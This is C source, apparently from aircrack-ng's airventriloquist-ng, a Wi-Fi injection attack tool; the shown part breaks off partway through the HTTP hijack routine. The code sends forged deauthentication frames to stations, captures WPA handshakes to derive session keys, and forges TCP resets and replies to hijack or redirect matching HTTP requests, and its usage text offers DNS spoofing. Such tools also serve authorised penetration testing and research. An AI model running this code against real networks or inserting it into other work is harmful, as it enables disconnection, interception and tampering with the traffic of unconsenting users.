/*
 *  802.11 injection attacks
 *
 *  Copyright (C) 2015 Tim de Waal
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#if defined(linux)
#include <linux/rtc.h>
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>

#include <fcntl.h>
#include <ctype.h>

#include <limits.h>

#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#include <fnmatch.h>
#include <stdbool.h>

#include "aircrack-ng/defs.h"
#include "aircrack-ng/version.h"
#include "aircrack-ng/support/pcap_local.h"
#include "aircrack-ng/osdep/osdep.h"
#include "aircrack-ng/support/communications.h"
#include "aircrack-ng/crypto/crypto.h"
#include "aircrack-ng/support/common.h"
#include "aircrack-ng/third-party/ieee80211.h"
#include "radiotap/radiotap_iter.h"
#include "airventriloquist-ng.h"

#define RTC_RESOLUTION 8192

#define REQUESTS 30
#define MAX_APS 20

#define NEW_IV 1
#define RETRY 2
#define ABORT 3

#define DEAUTH_REQ                                                             \
	"\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ                                                               \
	"\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"

#define ASSOC_REQ                                                              \
	"\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00"

#define REASSOC_REQ                                                            \
	"\x20\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00\x00\x00\x00\x00\x00\x00"

#define NULL_DATA                                                              \
	"\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B"

#define RTS "\xB4\x00\x4E\x04\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"

#define RATES "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C"

#define PROBE_REQ                                                              \
	"\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"

static char * progname = NULL;

static const char usage[]
	= "\n"
	  "  %s - (C) 2015 Tim de Waal\n"
	  "  https://www.aircrack-ng.org\n"
	  "\n"
	  "  usage: airventriloquist-ng [options]\n"
	  "\n"
	  "      -i <replay interface>   : Interface to listen and inject on\n"
	  "      -d | --deauth           : Send active deauths to encrypted "
	  "stations\n"
	  "      -e | --essid <value>    : ESSID of target network \n"
	  "      -p | --passphrase <val> : WPA Passphrase of target network\n"
	  "      -c | --icmp             : Respond to all ICMP frames (Debug)\n"
	  "      -n | --dns              : IP to resolve all DNS queries to\n"
	  "      -s | --hijack <URL>     : URL to look for in HTTP requests\n"
	  "                                <URL> can have wildcards\n"
	  "                                   eg: *jquery*.js*\n"
	  "      -r | --redirect <URL>   : URL to redirect to\n"
	  "      -v | --verbose          : Verbose output\n"
	  "      --help                  : This super helpful message\n"
	  "\n"
	  "\n";

struct communication_options opt;
static struct local_options
{
	char flag_icmp_resp;
	char flag_http_hijack;
	char flag_dnsspoof;
	char deauth;
	char flag_verbose;
	char * p_redir_url;
	char * p_redir_pkt_str;
	char * p_hijack_str;
	unsigned long p_dnsspoof_ip;

	// Copied from airdecap
	int decap_no_convert;
	char essid[36];
	char passphrase[65];
	uint8_t decap_bssid[6];
	uint8_t pmk[40];
	uint8_t decap_wepkey[64];
	int decap_weplen, crypt;
	int decap_store_bad;

	struct WPA_ST_info * st_1st;
	struct WPA_ST_info * st_cur;
	struct WPA_ST_info * st_prv;
} lopt;

struct devices dev;
extern struct wif *_wi_in, *_wi_out;

struct ARP_req
{
	uint8_t * buf;
	int hdrlen;
	int len;
};

struct APt
{
	uint8_t set;
	uint8_t found;
	uint8_t len;
	uint8_t essid[255];
	uint8_t bssid[6];
	uint8_t chan;
	unsigned int ping[REQUESTS];
	int pwr[REQUESTS];
};

unsigned long nb_pkt_sent;
extern uint8_t h80211[4096];
extern uint8_t tmpbuf[4096];

static int tcp_test(const char * ip_str, const short port)
{
	int sock, i;
	struct sockaddr_in s_in;
	int packetsize = 1024;
	uint8_t packet[packetsize];
	struct timeval tv, tv2 = {0}, tv3;
	int caplen = 0;
	int times[REQUESTS] = {0};
	int min, avg, max, len;
	struct net_hdr nh;

	tv3.tv_sec = 0;
	tv3.tv_usec = 1;

	memset(&s_in, 0, sizeof(struct sockaddr_in));
	s_in.sin_family = PF_INET;
	s_in.sin_port = htons(port);
	if (!inet_aton(ip_str, &s_in.sin_addr)) return (-1);

	if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)
		return (-1);

	/* avoid blocking on reading the socket */
	if (fcntl(sock, F_SETFL, O_NONBLOCK) < 0)
	{
		perror("fcntl(O_NONBLOCK) failed");
		close(sock);
		return (1);
	}

	gettimeofday(&tv, NULL);

	while (1) // waiting for relayed packet
	{
		if (connect(sock, (struct sockaddr *) &s_in, sizeof(s_in)) == -1)
		{
			if (errno != EINPROGRESS && errno != EALREADY)
			{
				perror("connect");
				close(sock);

				printf("Failed to connect\n");

				return (-1);
			}
		}
		else
		{
			gettimeofday(&tv2, NULL);
			break;
		}

		gettimeofday(&tv2, NULL);
		// wait 3000ms for a successful connect
		if (((tv2.tv_sec * 1000000 - tv.tv_sec * 1000000)
			 + (tv2.tv_usec - tv.tv_usec))
			> (3000 * 1000))
		{
			printf("Connection timed out\n");
			close(sock);
			return (-1);
		}
		usleep(10);
	}

	PCT;
	printf("TCP connection successful\n");

	// trying to identify airserv-ng
	memset(&nh, 0, sizeof(nh));
	//     command: GET_CHAN
	nh.nh_type = 2;
	nh.nh_len = htonl(0);

	if (send(sock, &nh, sizeof(nh), 0) != sizeof(nh))
	{
		perror("send");
		close(sock);
		return (-1);
	}

	gettimeofday(&tv, NULL);
	i = 0;

	while (1) // waiting for GET_CHAN answer
	{
		caplen = read(sock, &nh, sizeof(nh));

		if (caplen == -1)
		{
			if (errno != EAGAIN)
			{
				perror("read");
				close(sock);
				return (-1);
			}
		}

		if ((unsigned) caplen == sizeof(nh))
		{
			len = ntohl(nh.nh_len);
			if (nh.nh_type == 1 && i == 0)
			{
				i = 1;
				caplen = read(sock, packet, len);
				if (caplen == len)
				{
					i = 2;
					break;
				}
				else
				{
					i = 0;
				}
			}
			else
			{
				caplen = read(sock, packet, len);
			}
		}

		gettimeofday(&tv2, NULL);
		// wait 1000ms(1sec) for an answer
		if (((tv2.tv_sec * 1000000 - tv.tv_sec * 1000000)
			 + (tv2.tv_usec - tv.tv_usec))
			> (1000 * 1000))
		{
			break;
		}
		if (caplen == -1) usleep(10);
	}

	if (i == 2)
	{
		PCT;
		printf("airserv-ng found\n");
	}
	else
	{
		PCT;
		printf("airserv-ng NOT found\n");
	}

	close(sock);

	for (i = 0; i < REQUESTS; i++)
	{
		if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)
			return (-1);

		/* avoid blocking on reading the socket */
		if (fcntl(sock, F_SETFL, O_NONBLOCK) < 0)
		{
			perror("fcntl(O_NONBLOCK) failed");
			close(sock);
			return (1);
		}

		usleep(1000);

		gettimeofday(&tv, NULL);

		while (1) // waiting for relayed packet
		{
			if (connect(sock, (struct sockaddr *) &s_in, sizeof(s_in)) == -1)
			{
				if (errno != EINPROGRESS && errno != EALREADY)
				{
					perror("connect");
					close(sock);

					printf("Failed to connect\n");

					return (-1);
				}
			}
			else
			{
				gettimeofday(&tv2, NULL);
				break;
			}

			gettimeofday(&tv2, NULL);
			// wait 1000ms for a successful connect
			if (((tv2.tv_sec * 1000000 - tv.tv_sec * 1000000)
				 + (tv2.tv_usec - tv.tv_usec))
				> (1000 * 1000))
			{
				break;
			}
			// simple "high-precision" usleep
			select(1, NULL, NULL, NULL, &tv3);
		}
		times[i] = ((tv2.tv_sec * 1000000 - tv.tv_sec * 1000000)
					+ (tv2.tv_usec - tv.tv_usec));
		printf("\r%d/%d\r", i, REQUESTS);
		fflush(stdout);
		close(sock);
	}

	min = INT_MAX;
	avg = 0;
	max = 0;

	for (i = 0; i < REQUESTS; i++)
	{
		if (times[i] < min) min = times[i];
		if (times[i] > max) max = times[i];
		avg += times[i];
	}
	avg /= REQUESTS;

	PCT;
	printf("ping %s:%d (min/avg/max): %.3fms/%.3fms/%.3fms\n",
		   ip_str,
		   port,
		   min / 1000.0,
		   avg / 1000.0,
		   max / 1000.0);

	return (0);
}

// TODO: this function is hacked together, It should be cleaned up
// Need to use wfrm (ieee80211_frame struct instead of just a buffer)
static int deauth_station(struct WPA_ST_info * st_cur)
{
	REQUIRE(st_cur != NULL);

	if (memcmp(st_cur->stmac, NULL_MAC, 6) != 0)
	{
		/* deauthenticate the target */

		memcpy(h80211, DEAUTH_REQ, 26);
		memcpy(h80211 + 16, st_cur->bssid, 6);

		int i;
		for (i = 0; i < 5; i++)
		{
			PCT;
			printf("Sending 5 directed DeAuth. STMAC:"
				   " [%02X:%02X:%02X:%02X:%02X:%02X] \r",
				   st_cur->stmac[0],
				   st_cur->stmac[1],
				   st_cur->stmac[2],
				   st_cur->stmac[3],
				   st_cur->stmac[4],
				   st_cur->stmac[5]);

			memcpy(h80211 + 4, st_cur->stmac, 6);
			memcpy(h80211 + 10, st_cur->bssid, 6);

			if (send_packet(_wi_out, h80211, 26, kRewriteSequenceNumber) < 0)
				return (1);

			// Send deauth to the AP...
			memcpy(h80211 + 4, st_cur->bssid, 6);
			memcpy(h80211 + 10, st_cur->stmac, 6);

			if (send_packet(_wi_out, h80211, 26, kRewriteSequenceNumber) < 0)
				return (1);
			// Usually this is where we would wait for an ACK, but we need to
			// get back
			// to capturing packets to get the EAPOL 4 way handshake
		}

		return (0);
	}

	return (0);
}

// Shameless copy from tshark/wireshark?
static void hexDump(char * desc, void * addr, int len)
{
	int i;
	uint8_t buff[17];
	uint8_t * pc = (uint8_t *) addr;

	// Output description if given.
	if (desc != NULL) printf("%s:\n", desc);

	// Process every byte in the data.
	for (i = 0; i < len; i++)
	{
		// Multiple of 16 means new line (with line offset).
		if ((i % 16) == 0)
		{
			// Just don't print ASCII for the zeroth line.
			if (i != 0) printf("  %s\n", buff);

			// Output the offset in Hex.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e))
			buff[i % 16] = '.';
		else
			buff[i % 16] = pc[i];
		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0)
	{
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}

/* calcsum - used to calculate IP and ICMP header checksums using
 * one's compliment of the one's compliment sum of 16 bit words of the header
 */
static uint16_t calcsum(char * buffer, size_t length)
{
	uint32_t sum = 0;

	for (size_t i = 0; i < length - 1; i += 2)
		sum += (buffer[i] << 8) + buffer[i + 1];

	if (length % 2) sum += buffer[length - 1];

	while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);

	return ((uint16_t)(~sum));
}

static uint16_t calcsum_for_protocol(uint16_t protocol,
									 char * buf,
									 size_t length,
									 uint32_t src_addr,
									 uint32_t dest_addr)
{
	uint32_t chksum = 0;
	uint16_t * ip_src = (uint16_t *) &src_addr;
	uint16_t * ip_dst = (uint16_t *) &dest_addr;

	// Calculate the chksum
	for (size_t i = 0; i < length - 1; i += 2)
		chksum += (buf[i] << 8) + buf[i + 1];

	if (length % 2) chksum += buf[length - 1];

	// Add the pseudo-header
	chksum += *(ip_src++);
	chksum += *ip_src;

	chksum += *(ip_dst++);
	chksum += *ip_dst;

	chksum += htons(protocol);
	chksum += htons(length);

	while (chksum >> 16) chksum = (chksum & 0xFFFF) + (chksum >> 16);

	// Return the one's complement of chksum
	return ((uint16_t)(~chksum));
}

// This needs to be cleaned up so that we can do UDP/TCP in one function. Don't
// want to do that now and risk
// breaking UDP checksums right now
static uint16_t
calcsum_tcp(char * buf, size_t length, uint32_t src_addr, uint32_t dest_addr)
{
	return calcsum_for_protocol(IPPROTO_TCP, buf, length, src_addr, dest_addr);
}

static uint16_t
calcsum_udp(char * buf, size_t length, uint32_t src_addr, uint32_t dest_addr)
{
	return calcsum_for_protocol(IPPROTO_UDP, buf, length, src_addr, dest_addr);
}

static inline uint8_t * packet_get_sta_80211(uint8_t * pkt)
{
	REQUIRE(pkt != NULL);

	struct ieee80211_frame * p_res802 = (struct ieee80211_frame *) pkt;

	// IF TODS
	if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_TODS)
	{
		return ((uint8_t *) &p_res802->i_addr2);
	}
	// IF FROMDS
	else if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
	{
		return ((uint8_t *) &p_res802->i_addr1);
	}

	return (NULL);
}

static inline uint8_t * packet_get_bssid_80211(uint8_t * pkt)
{
	REQUIRE(pkt != NULL);

	struct ieee80211_frame * p_res802 = (struct ieee80211_frame *) pkt;

	// IF TODS
	if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_TODS)
	{
		return ((uint8_t *) &p_res802->i_addr1);
	}
	// IF FROMDS
	else if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
	{
		return ((uint8_t *) &p_res802->i_addr2);
	}

	return (NULL);
}

static void packet_turnaround_80211(uint8_t * pkt)
{
	REQUIRE(pkt != NULL);

	struct ieee80211_frame * p_res802 = (struct ieee80211_frame *) pkt;
	uint8_t tmp_mac[IEEE80211_ADDR_LEN] = {0};

	// IF TODS, flip to FROMDS
	if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_TODS)
	{
		p_res802->i_fc[1] = p_res802->i_fc[1] & ~(char) IEEE80211_FC1_DIR_TODS;
		p_res802->i_fc[1] = p_res802->i_fc[1] | IEEE80211_FC1_DIR_FROMDS;
	}
	// IF FROMDS, Flip to TODS
	else if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
	{
		p_res802->i_fc[1] = p_res802->i_fc[1] & ~IEEE80211_FC1_DIR_FROMDS;
		p_res802->i_fc[1] = p_res802->i_fc[1] | IEEE80211_FC1_DIR_TODS;
	}

	memcpy(tmp_mac, p_res802->i_addr1, IEEE80211_ADDR_LEN);
	memcpy(p_res802->i_addr1, p_res802->i_addr2, IEEE80211_ADDR_LEN);
	memcpy(p_res802->i_addr2, tmp_mac, IEEE80211_ADDR_LEN);
}

static void packet_turnaround_ip(struct ip_frame * p_resip)
{
	REQUIRE(p_resip != NULL);

	// Switch the IP source and destination addresses
	uint32_t tmp_addr = p_resip->saddr;
	p_resip->saddr = p_resip->daddr;
	p_resip->daddr = tmp_addr;
	p_resip->ttl = 63;
}

static void packet_turnaround_ip_udp(struct udp_hdr * p_resudp)
{
	REQUIRE(p_resudp != NULL);

	// Switch the UDP source and destination Ports
	uint16_t tmp_port = p_resudp->sport;
	p_resudp->sport = p_resudp->dport;
	p_resudp->dport = tmp_port;
}

static void packet_turnaround_ip_tcp(struct tcp_hdr * p_restcp,
									 uint32_t next_seq_hint)
{
	REQUIRE(p_restcp != NULL);

	// Switch the TCP source and destination Ports
	uint16_t tmp_port = p_restcp->sport;
	p_restcp->sport = p_restcp->dport;
	p_restcp->dport = tmp_port;

	uint32_t tmp_num = p_restcp->seqnu;
	p_restcp->seqnu = p_restcp->ack_seq;
	p_restcp->ack_seq = tmp_num;

	// Increment seq by the length of the data in the current packet
	tmp_num = ntohl(p_restcp->ack_seq) + next_seq_hint;

	p_restcp->ack_seq = htonl(tmp_num);
}

static uint16_t dns_name_end(uint8_t * buff, uint16_t maxlen)
{
	REQUIRE(buff != NULL);

	uint8_t * ptr = buff;
	uint8_t count = 0;
	uint16_t offset = 0;

	while (offset < maxlen)
	{
		count = ptr[0] + 1;
		offset += count;
		ptr += count;

		if (count == 1) break;
	};

	return (offset);
}

static int strip_ccmp_header(uint8_t * h80211, int caplen, unsigned char PN[6])
{
	REQUIRE(h80211 != NULL);

	int is_a4, z, is_qos;

	is_a4 = (h80211[1] & 3) == 3;
	is_qos = (h80211[0] & 0x8C) == 0x88;
	z = 24 + 6 * is_a4;
	z += 2 * is_qos;

	// Insert CCMP header
	PN[5] = h80211[z + 0];
	PN[4] = h80211[z + 1];
	PN[3] = h80211[z + 4];
	PN[2] = h80211[z + 5];
	PN[1] = h80211[z + 6];
	PN[0] = h80211[z + 7];
	memmove(h80211 + z, h80211 + z + 8, caplen - z);

	// return new length, encrypt_ccmp() expects on encryption artifacts in
	// frame,
	// and states frame is encrypted in place resulting in extra 16 bytes?
	return (caplen - 16);
}

static void
encrypt_data_packet(uint8_t * packet, int length, struct WPA_ST_info * sta_cur)
{
	if ((NULL == sta_cur) || (!sta_cur->valid_ptk))
	{
		return;
	}
	else
	{
		// if the PTK is valid, try to decrypt
		if (sta_cur->keyver == 1)
		{
			encrypt_tkip(packet, length, sta_cur->ptk);
		}
		else
		{
			// This will take the current packet that already
			// has a ccmp header and strip it and return the PN
			// This is required so that we comply with the
			// encrypt_ccmp function in crypto.c
			unsigned char PN[6] = {0};
			length = strip_ccmp_header(packet, length, PN);
			encrypt_ccmp(packet, length, sta_cur->ptk + 32, PN);
		}
	}
}

// Global packet buffer for use in building response packets
static uint8_t pkt[2048] = {0};

static void process_unencrypted_data_packet(uint8_t * packet,
											uint32_t length,
											uint32_t debug)
{
	if (debug) hexDump("full", packet, length);

	uint8_t * packet_start = packet;
	int packet_start_length = length;
	char extra_enc_length = 0;

	struct ieee80211_frame * wfrm = (struct ieee80211_frame *) packet;

	int size_80211hdr = sizeof(struct ieee80211_frame);

	// Check to see if we have a QOS 802.11 frame
	if (IEEE80211_FC0_SUBTYPE_QOS & wfrm->i_fc[0])
	{
		size_80211hdr = sizeof(struct ieee80211_qosframe);
		// Here's an idea from a presentation out of NL, assign this packet
		// a QOS priority that isn't used in order to not collide with
		// squence numbers from the real AP/STA
		struct ieee80211_qosframe * wqfrm
			= (struct ieee80211_qosframe *) packet;
		wqfrm->i_qos[0] = 0x7;
	}

	// Increment the 802.11 sequence number
	uint16_t * p_seq = (uint16_t *) &wfrm->i_seq;
	uint16_t pkt_sent = (*p_seq) >> 4;
	pkt_sent += 1;
	packet[22] = (pkt_sent & 0x0000000F) << 4;
	packet[23] = (pkt_sent & 0x00000FF0) >> 4;

	// Skip over the 802.11 header
	packet += size_80211hdr;
	length -= size_80211hdr;

	// If the protected bit is set, we decrypted this packet and passed it on
	// here
	// Calculate the correct offset to the start of the data
	if (IEEE80211_FC1_WEP & wfrm->i_fc[1])
	{
		if (0 == (packet[3] & 0x20))
		{
			// this is a regular WEP IV field
			extra_enc_length = 4;
		}
		else
		{
			// this is a Extended IV field
			extra_enc_length = 8;
		}
		packet += (uintptr_t) extra_enc_length;
		length -= extra_enc_length;
		size_80211hdr += extra_enc_length;
	}

	struct llc_frame * p_llc = (struct llc_frame *) packet;
	if (debug) hexDump("llc", p_llc, length);
	packet += sizeof(struct llc_frame);
	length -= sizeof(struct llc_frame);
	// Sanity check...
	// We should have a data packet. Check for LLC
	if (p_llc->i_dsap == 0xAA && p_llc->i_ssap == 0xAA)
	{
		// If it's an EAPOL frame, let's capture the handshake
		if (ETHTYPE_8021x == p_llc->i_ethtype)
		{
			struct dot1x_hdr * p_d1x = (struct dot1x_hdr *) packet;
			struct radius_hdr * p_rhdr
				= (struct radius_hdr *) (packet + sizeof(struct dot1x_hdr));

			// Must be a key frame, and must be RSN (2) or WPA (254)
			if ((DOT1X_ID_EAP_KEY != p_d1x->idtype)
				|| (2 != p_rhdr->code && 254 != p_rhdr->code))
			{
				return;
			}

			// frame 1 of 4: Pairwise == 1, Install == 0, Ack == 1, MIC == 0,
			// Secure == 0 */
			if (1 == p_rhdr->key_type && 0 == p_rhdr->key_install
				&& 1 == p_rhdr->key_ack
				&& 0 == p_rhdr->key_mic)
			{
				/* set authenticator nonce */
				memcpy(lopt.st_cur->anonce, p_rhdr->wpa_nonce, 32);
				printf(COL_4WAYHS "------> #1, Captured anonce " COL_REST);
				PRINTMAC(lopt.st_cur->stmac);
			}

			/* frame 2 of 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1,
			 * Secure == 0 */
			/* frame 4 of 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1,
			 * Secure == 1 */
			if (1 == p_rhdr->key_type && 0 == p_rhdr->key_install
				&& 0 == p_rhdr->key_ack
				&& 1 == p_rhdr->key_mic)
			{
				if (memcmp(p_rhdr->wpa_nonce, ZERO, 32) != 0)
				{
					/* set supplicant nonce */
					memcpy(lopt.st_cur->snonce, p_rhdr->wpa_nonce, 32);
					printf(COL_4WAYHS "------> #2, Captured snonce " COL_REST);
				}
				else
				{
					printf(COL_4WAYHS "------> #4, Captured        " COL_REST);
				}
				PRINTMAC(lopt.st_cur->stmac);

				lopt.st_cur->eapol_size
					= ntohs(p_d1x->length) + 4; // 4 is sizeof radius header

				if (length < lopt.st_cur->eapol_size
					|| lopt.st_cur->eapol_size == 0 //-V560
					|| lopt.st_cur->eapol_size > sizeof(lopt.st_cur->eapol))
				{
					// Ignore the packet trying to crash us.
					printf("Caught a packet trying to crash us, sneaky "
						   "bastard!\n");
					hexDump("Offending Packet:", packet, length);
					lopt.st_cur->eapol_size = 0;
					return;
				}
				// Save the MIC
				memcpy(lopt.st_cur->keymic, p_rhdr->wpa_key_mic, 16);
				// Save the whole EAPOL frame
				memcpy(lopt.st_cur->eapol, p_d1x, lopt.st_cur->eapol_size);
				// Clearing the MIC in the saves EAPOL frame
				memset(lopt.st_cur->eapol + 81, 0, 16);

				// copy the key descriptor version
				lopt.st_cur->keyver = p_rhdr->key_ver;
			}

			/* frame 3 of 4: Pairwise == 1, Install == 1, Ack == 1, MIC == 1,
			 * Secure == 1 */
			if (1 == p_rhdr->key_type && 1 == p_rhdr->key_install
				&& 1 == p_rhdr->key_ack
				&& 1 == p_rhdr->key_mic)
			{
				if (memcmp(p_rhdr->wpa_nonce, ZERO, 32) != 0)
				{
					/* set authenticator nonce (again) */
					memcpy(lopt.st_cur->anonce, p_rhdr->wpa_nonce, 32);
					printf(COL_4WAYHS "------> #3, Captured anonce " COL_REST);
					PRINTMAC(lopt.st_cur->stmac);
				}
				// WARNING: Serious Code Reuse here!!!
				lopt.st_cur->eapol_size
					= ntohs(p_d1x->length) + 4; // 4 is sizeof radius header

				if (length < lopt.st_cur->eapol_size
					|| lopt.st_cur->eapol_size == 0 //-V560
					|| lopt.st_cur->eapol_size > sizeof(lopt.st_cur->eapol))
				{
					// Ignore the packet trying to crash us.
					printf("Caught a packet trying to crash us, sneaky "
						   "bastard!\n");
					hexDump("Offending Packet:", packet, length);
					lopt.st_cur->eapol_size = 0;
					return;
				}
				// Save the MIC
				memcpy(lopt.st_cur->keymic, p_rhdr->wpa_key_mic, 16);
				// Save the whole EAPOL frame
				memcpy(lopt.st_cur->eapol, p_d1x, lopt.st_cur->eapol_size);
				// Clearing the MIC in the saves EAPOL frame
				memset(lopt.st_cur->eapol + 81, 0, 16);

				// copy the key descriptor version
				lopt.st_cur->keyver = p_rhdr->key_ver;
			}

			memset(lopt.st_cur->ptk, 0, 80);

			lopt.st_cur->valid_ptk = calc_ptk(lopt.st_cur, lopt.pmk);
			if (1 == lopt.st_cur->valid_ptk)
			{

				hexDump(
					COL_4WAYKEY "MIC" COL_4WAYKEYDATA, lopt.st_cur->keymic, 16);
				hexDump(
					COL_4WAYKEY "stmac" COL_4WAYKEYDATA, lopt.st_cur->stmac, 6);
				hexDump(
					COL_4WAYKEY "bssid" COL_4WAYKEYDATA, lopt.st_cur->bssid, 6);
				hexDump(COL_4WAYKEY "anonce" COL_4WAYKEYDATA,
						lopt.st_cur->anonce,
						32);
				hexDump(COL_4WAYKEY "snonce" COL_4WAYKEYDATA,
						lopt.st_cur->snonce,
						32);
				hexDump(COL_4WAYKEY "keymic" COL_4WAYKEYDATA,
						lopt.st_cur->keymic,
						16);
				hexDump(COL_4WAYKEY "epol" COL_4WAYKEYDATA,
						lopt.st_cur->eapol,
						lopt.st_cur->eapol_size);
				printf(COL_BLUE "Valid key: ");
				PRINTMAC(lopt.st_cur->stmac);
				printf("\n" COL_REST);
			}

			return;
		}
		else if ((short) ETHTYPE_IP == p_llc->i_ethtype)
		{
			// We have an IP frame
			int offset_ip = size_80211hdr + sizeof(struct llc_frame);
			int offset_proto = offset_ip + sizeof(struct ip_frame);

			struct ip_frame * p_ip = (struct ip_frame *) packet;
			packet += sizeof(struct ip_frame);
			length -= sizeof(struct ip_frame);

			if ((short) PROTO_TCP == p_ip->protocol)
			{

				struct tcp_hdr * p_tcp = (struct tcp_hdr *) packet;
				if (80 == ntohs(p_tcp->dport))
				{
					length += extra_enc_length;
					// TCP header size = first 4bits * 32 / 8, same as first
					// 4bits *4
					uint32_t hdr_size = p_tcp->doff * 4;
					uint8_t * p_http = packet + hdr_size;
					uint32_t l_http = length - hdr_size;
					// Find a GET
					if ((1 == lopt.flag_http_hijack)
						&& (p_http[0] == 0x47 && p_http[1] == 0x45
							&& p_http[2] == 0x54))
					{
						int ret = fnmatch((const char *) lopt.p_hijack_str,
										  (const char *) p_http,
										  FNM_PERIOD);
						if (0 == ret)
						{
							printf("This frame matched a term we are looking "
								   "for\n");
							if (NULL != lopt.p_redir_url)
							{
								char * p_hit
									= strstr((const char *) p_http,
											 (const char *) lopt.p_redir_url);
								if (NULL != p_hit)
								{
									printf("Caught our own redirect, ignoring "
										   "this packet\n");
									return;
								}
								else
								{
									printf("this is not a redirect to our "
										   "server\n");
								}
							}
						}
						else
						{
							printf("pattern %s, not in this packet\n",
								   lopt.p_hijack_str);
							return;
						}

						memcpy(pkt, packet_start, packet_start_length);

						struct tcp_hdr * p_restcp
							= (struct tcp_hdr *) (pkt + offset_proto);
						struct ip_frame * p_resip
							= (struct ip_frame *) (pkt + offset_ip);
						uint32_t res_length
							= packet_start_length; // This only initially until
						// we replace content

						//-----------------------------------------------------------------------------
						// Do some magic here... to create a frame to close the
						// server connection
						memcpy(tmpbuf, pkt, packet_start_length);
						struct ip_frame * p_resip_ack
							= (struct ip_frame *) (tmpbuf + offset_ip);
						struct tcp_hdr * p_restcp_ack
							= (struct tcp_hdr *) (tmpbuf + offset_proto);

						res_length
							= offset_proto + hdr_size
							  + extra_enc_length; // have to account for MIC
						p_resip_ack->id = htons(ntohs(p_resip_ack->id) + 1023);
						p_resip_ack->tot_len
							= htons(hdr_size + sizeof(struct ip_frame));
						p_resip_ack->check = 0;
						p_resip_ack->check = calcsum((void *) p_resip_ack,
													 sizeof(struct ip_frame));

						// We could try some stuff with tcp reset
						p_restcp_ack->rst = 1;

						// Lets calculate the TCP checksum
						p_restcp_ack->checksum = 0;
						p_restcp_ack->checksum
							= calcsum_tcp((void *) p_restcp_ack,
										  (hdr_size),
										  p_resip_ack->saddr,
										  p_resip_ack->daddr);

						int tmpbuf_len = res_length;
						// Going to send the packet later, after we send the
						// redirect...
						//-----------------------------------------------------------------------------
						// The silly extra TCP options were messing with me,
						// Packets with TCP options
						// Weren't being accepted. Probably some silly offset
						// miscalculation. But for
						// Our purposes, just cut these out.
						// So get those options out of there
						int diff = hdr_size - sizeof(struct tcp_hdr);
						if (0 != diff)
						{
							hdr_size = sizeof(struct tcp_hdr);
							p_resip->tot_len
								= htons(ntohs(p_resip->tot_len) - diff);
						}
						// Update the TCP header with the new size (if changed)
						p_restcp->doff = hdr_size / 4;

						// start manipulating the packet to turn it around back
						// to the sender
						packet_turnaround_80211(pkt);
						packet_turnaround_ip(p_resip);
						packet_turnaround_ip_tcp(p_restcp,
												 ntohs(p_resip->tot_len)
													 - sizeof(struct ip_frame)
													 - hdr_size);

						// Pointer to the start of the http section
